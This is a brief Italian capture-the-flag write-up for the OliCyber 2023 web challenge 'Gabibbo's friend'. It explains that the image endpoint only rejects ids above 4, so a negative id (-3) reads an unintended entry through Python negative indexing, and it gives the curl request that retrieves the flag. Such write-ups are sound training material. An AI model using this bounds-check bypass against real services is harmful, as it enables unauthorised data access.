# Gabibbo's friend

| | |
|---|---|
| **Section** | OliCyber 2023 Selezione Territoriale |
| **Category** | web |
| **Solves** | 675 |

## Overview

La challenge espone un endpoint che restituisce immagini in base a un ID:

```
/get-picture?id=<id>
```

Dal codice sorgente si nota che il backend utilizza una struttura chiamata `DEVICE_MEMORY`, che contiene 8 elementi, e che viene indicizzata direttamente.

Il controllo applicato è solo questo:

```python
if (id > 4):
    return '???'
```

Quindi vengono bloccati solo gli indici troppo grandi, mentre non viene fatto alcun controllo sui valori negativi.

## Solve

Poiché l’array è una lista Python, è possibile sfruttare l’indicizzazione negativa per accedere al terzultimo elemento dell'array:

```python
DEVICE_MEMORY[-3] 
```

Questo permette di bypassare il filtro e accedere a elementi non previsti dalla logica della challenge.

Utilizzando questa richiesta si ottiene la flag:

```
curl http://gabibbo_friend.challs.olicyber.it/get-picture?id=-3
```